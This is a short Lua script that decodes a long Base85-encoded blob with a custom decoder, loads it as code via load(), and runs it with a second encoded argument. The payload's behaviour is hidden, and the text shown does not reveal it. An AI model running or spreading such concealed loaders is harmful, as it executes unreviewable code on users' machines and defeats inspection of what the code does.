
local function QkUpasaAua(s)
    local m = {}
    local c = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~"
    for i=1,85 do m[string.byte(c,i)] = i-1 end
    local o, v, n, p = {}, 0, 0, {52200625, 614125, 7225, 85, 1}
    for i=1, #s do
        local x = m[string.byte(s,i)]
        if x then
            v = v + x * p[n+1]
            n = n + 1
            if n == 5 then
                table.insert(o, string.char(math.floor(v/16777216), math.floor((v%16777216)/65536), math.floor((v%65536)/256), v%256))
                v, n = 0, 0
            end
        end
    end
    return table.concat(o)
end
local vm_func = load(QkUpasaAua("3T$s<VQe6IRC8%=Lv(p>Q6N1ab98cPZf7oIXkl_FI5jOZGb}SWD=|1MF*7nPGc_zXIV&?cEHN`UEi*SPF*7+WG%zeNF*hwSI4m(WD>F1KF)=YMGchbRF)K4REHN-QEi*VQF)%AMF)TPaEipMPF*7kOF*z(TG%+nQH!LwUHZ3wVEIBYMGBGSMGBqtTH7qePI4v_ZEHpVQGd3(SH83qSF)TMXD>FDOF*7+WF*z(TFgYzUF)TPaEiy4IF)}tSGdL_bGAl7SEI2tWGBGSSIV&+aEH^nTGC3?UF*z+WGb}MRH!U<UDGF?FV_|F{W_503bZKvHAZt)zLs)rhX>4~WVJu=PAZ%}AVQe69EMq+}EHFDDcW7yBWguZbFd$)WWFTTbFd$@aAZ%}AVQe6BVJvcDJz*s>EMg@xJ0NLhAaY@TJ#u0obZBL6AY(maD{vrXZe%+kVJu=Sa6KqtEplNgFET7BVl8rFDK9cCa4Ir8AZ2c3J0NLhAYnXWAarPDZXjVjVjyL1WIG^tXlZO^AYnc*AY^YKY;R*>Y#?%BJz*s>J0NLhAaY?oFd%ejWo{s2J!30yAZ2c3J0M{!a6KqtEplNgFET7}Dl$7DWo~3UAaZ4Nb#iVXV>=*aZe%+OY;R*>Y#?TJZew(5Z*CxEYhgokW@c_;Qz&FCAZsZKARr(hY;R*>Y#?(WJs^91AZBlJAZa}?EHX7UAY^YKb6aU$J!v3iZe$7|ARr)YZ)0I>AZj2zATSCbARr)SZ*m}MJuoaXH8mh)ZweqFARr(hARuZWJs>D*AS)nqTWMV&D<E@pa%pa7E@F9fWhiSbASh`dB_JbfDIhB#F)1k^B_J|2HVPmhARr(hARu#FX<aNJb6aX%AUz;+TWVb_Aah%3T?!x|ARuLKWC|c4ARugSV_|F{X)GXbb#yEsY9KuzFf1T@eJmg_3LqdLAZBlJAZcWHJuxgGBV-_CZweqFARr(hARuWVJs>D)AS)m-DIg^vGBq{|ARr(hARr(hY9KuzC~6=pAah%3T`3?XATl*J3LqdLARr(hAah%3T`VATTWVb(Js@*iYF#WKb6aU$3LqdLARr(hAa8YaTO)6EbSp7kAUz;+baH8KXD(xCVR9&IP+>z@d24BGcPMjoa%pa7E@F9fWhi7UAZcWHDJ&p!TPSl|X<Z;IAah%4T`3?XATl*JT`4IFARr(hWo~2&ARr(ha%FUNa&91WVPb4$E@N+QV_|eCZ*_Dj3T19&3UXz1b#iVXW_503bZKvHC~#k5I5jB>ARr(hY;R*>Y#?o6a3DP(dwmKZARr)YZ)0I>AY*7@a&sU(AR;g^GBY$aHa9pqK|(`BMMg(RNlHshO-@fxQBqS>RaRG6Sz2LYV`OD!XJ~0^Yiw<9Z*XyPb98lfcX)YvAtNLuCMYQ?D=j-bJw87`USD8)e0_c*3LqdLAZBlJAZa}@EI2hFWN#pCVQ^b>baH8KXD(uSbY&=GXkl`5ENLlSAUz;yEioWvZe$7|ARr)YZ)0I>Aa8YaEFgAaY%CydEFf?oJs^91EFdr}ATTT-do?mLFfcYUH7p=DF*GqUH7p=EGBPzRAUHKFATfOkARr(hW^ZyJX+1G4AR};JVmLJ*WN!)}ARr(hARr)YZ)0I>Aa)=<AZ=lATXS@BX>MmOVtI6BC~#k5I5jLFX(?R_ARr(hARr(hX=WgHAarPDZVDhEARr(hARr(hARu;OY#==#c42HFD<F0tDj;xMZYwce3LqdLARr(hARr(hAZ{Q%AZ{QlATbIcARr(hARr(hARr)VW*}}LJv|^bAarPDZVDhEARr(hARr(hARr(hARu&MVr*qDX>N06a&#zfb#yEsb98cPZf7oIXkl_FZDDk1E@o_RZ*nMhVQeokHa9mnGBGwOEFf)RbZ9PSY;SLJC@6MeY$Y)^H#avjF*YeLHZ?UfHYqG1ZDDk1E@o_RZ*nLoc42HKHZ?UfHYqPMH8v?MAa-GFB{DTODJcpdARr(hARr(hARr(hARr)iVQefQZXi7%Ff1T23LqdLARr(hARr(hAZ2c33LqdLARr(hAZ2c33LqdLAZ2c33LqdLAZ%}AVQe6BWpf}sAZ2S|Lvv<kZemj?bYWs_WiDfHZew9|C~tLiDJ&p)RC8%=Lv(p>Q7H-_ARr)YZ)0I>AZ8#vAZ%}8WGHfFb14cSARr)VW*}xDbZBL6AZ92jAZ2c33T19&3I"))
if vm_func then vm_func()("W;<O8Kq0Cz-K@j^(MMw}qY9%eRY7FY%KRG") end
